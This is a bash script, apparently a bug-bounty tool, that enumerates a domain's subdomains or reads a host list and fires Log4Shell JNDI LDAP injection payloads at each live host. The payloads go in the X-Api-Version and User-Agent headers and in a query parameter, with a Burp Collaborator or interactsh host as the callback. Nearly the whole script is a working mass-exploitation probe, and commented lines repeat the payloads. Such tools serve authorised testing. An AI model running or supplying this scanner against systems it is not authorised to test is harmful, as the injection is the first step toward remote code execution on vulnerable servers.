#! /bin/bash

#        :::'###::::'########::'####:'##::::::::'######:::'#######::'##:::'##:'########:::::'###::::'##:::::::'####:
#        ::'## ##::: ##.... ##:. ##:: ##:::::::'##... ##:'##.... ##:. ##:'##:: ##.... ##:::'## ##::: ##:::::::. ##::
#        :'##:. ##:: ##:::: ##:: ##:: ##::::::: ##:::..:: ##:::: ##::. ####::: ##:::: ##::'##:. ##:: ##:::::::: ##::
#        :##:::. ##: ##:::: ##:: ##:: ##:::::::. ######:: ##:::: ##:::. ##:::: ########::'##:::. ##: ##:::::::: ##::
#        :#########: ##:::: ##:: ##:: ##::::::::..... ##: ##:::: ##:::: ##:::: ##.... ##: #########: ##:::::::: ##::
#        :##.... ##: ##:::: ##:: ##:: ##:::::::'##::: ##: ##:::: ##:::: ##:::: ##:::: ##: ##.... ##: ##:::::::: ##::
#        :##:::: ##: ########::'####: ########:. ######::. #######::::: ##:::: ########:: ##:::: ##: ########:'####:
#        :.:::::..::........:::....::........:::......::::.......::::::..:::::........:::..:::::..::........::....::
#        01000001 01100100 01101001 01101100 01110011 01101111 01111001 01100010 01100001 01101100 01101001
#        https://github.com/adilsoybali
#        https://adilsoybali.com
#        https://seccops.com

showHelp() {
cat << EOF  
$(tput setaf 2)
Usage: 
$0 -l httpxsubdomains.txt -b yrt45r4sjyoj19617jem5briio3cs.burpcollaborator.net
$0 -d adilsoybali.com -b yrt45r4sjyoj19617jem5briio3cs.burpcollaborator.net

-h, --help              Display help

-l, --url-list          List of domain/subdomain/ip to be used for scanning.

-d, --domain            The domain name to which all subdomains and itself will be checked.

-b, --burpcollabid      Burp collabrator client id address or interactsh domain address.
$(tput sgr0)
EOF
}

domainScan() {
    echo -e "\n$(tput setaf 2 ; tput rev ; tput bold) Subfinder is working $(tput sgr0)\n" ; subfinder -silent -d sub.$domain >> sub.$domain ; echo -e "\n$(tput setaf 2 ; tput rev ; tput bold) Assetfinder is working $(tput sgr0)\n" ; assetfinder -subs-only $domain >> sub.$domain ; echo -e "\n$(tput setaf 2 ; tput rev ; tput bold) Amass is working $(tput sgr0)\n" ; amass enum -norecursive --silent -noalts -d $domain >> sub.$domain ; cat sub.$domain | sort -u | httpx -silent | while read url; do 
    echo 'curl -s --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
    echo 'curl -s --max-time 20 '$url/?test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$burpcollabid/a\\\}}'|g" | sed "s|\$url|$url|g" | bash
    echo 'curl -s --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
    echo -e "\033[104m[ DOMAIN ==> $url ]\033[0m" "\n" "\033[92m Method 1 ==> X-Api-Version: running-Ldap-payload" "\n" " Method 2 ==> Useragent: running-Ldap-payload" "\n" " Method 3 ==> $url/?test=running-Ldap-payload" "\n\033[0m";done
}

listScan() {
    cat $list | sort -u | httpx -silent | while read url; do 
    echo 'curl -s --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$url.$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
    echo 'curl -s --max-time 20 '$url/?test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$url.$burpcollabid/a\\\}}'|g" | sed "s|\$url|$url|g" | bash
    echo 'curl -s --max-time 20 $url -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$url.$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
    echo -e "\033[104m[ DOMAIN ==> $url ]\033[0m" "\n" "\033[92m Method 1 ==> X-Api-Version: running-Ldap-payload" "\n" " Method 2 ==> Useragent: running-Ldap-payload" "\n" " Method 3 ==> $url/?test=running-Ldap-payload" "\n\033[0m";done
}

while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
  -l | --url-list )
    list="$2"
    if [[ "$3" == "-b" || "$3" == "--burpcollabid" ]]; then
    burpcollabid="$4"
    else
    showHelp
    exit
    fi
    listScan
    exit
    ;;
  -d | --domain )
    domain="$2"
    if [[ "$3" == "-b" || "$3" == "--burpcollabid" ]]; then
    burpcollabid="$4"
    else
    showHelp
    exit
    fi
    domainScan
    exit
    ;;
  *)
    showHelp
    exit
    ;;
esac; shift; done
if [[ "$1" == '--' ]]; then
shift
else
showHelp
exit
fi

# tested 1
# echo 'curl -s $url -H 'log4jPayload'' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash

# tested 2
# echo 'curl -s '$url/?test=log4jPayload'' | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$burpcollabid/a\\\}}'|g" | sed "s|\$url|$url|g" | bash

# tested 3
# echo 'curl -s $url -H 'log4jPayload'' | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$burpcollabid/a}'|g" | sed "s|\$url|$url|g" | bash
